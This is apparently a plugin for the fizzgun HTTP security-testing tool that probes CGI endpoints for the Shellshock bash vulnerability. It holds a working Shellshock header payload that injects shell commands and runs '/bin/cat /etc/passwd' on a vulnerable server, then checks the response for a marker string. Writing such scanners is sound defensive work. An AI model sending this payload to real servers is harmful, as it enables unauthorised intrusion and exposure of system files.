from fizzgun.bubbles import Bubble
from fizzgun.models import HttpRequestBuilder, HttpRequest


class Shellshock(Bubble):
    """
    Attempts to exploit the shellshock bash vulnerability by injecting a specially crafted header
    (CVE-2014-6271, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187, CVE-2014-6277 and CVE 2014-6278)
    """

    TAGS = ['name:shellshock', 'category:security', 'data:headers']

    def initialize(self, *args, **kwargs):
        super(Shellshock, self).initialize(*args, **kwargs)
        self.expectations.expect('body').not_to.include('sh3llsh0ck')

    # Override
    def does_apply(self, request: HttpRequest):
        return 'cgi' in request.path

    # Override
    def generate(self, request: HttpRequest):
        req_builder = HttpRequestBuilder.new_from(request.value)
        h = '() { test;};echo "Content-type: text/plain"; echo; echo; echo -n sh3ll; echo sh0ck; /bin/cat /etc/passwd'
        yield req_builder.with_header('X-FizzGun-SS', h).build()
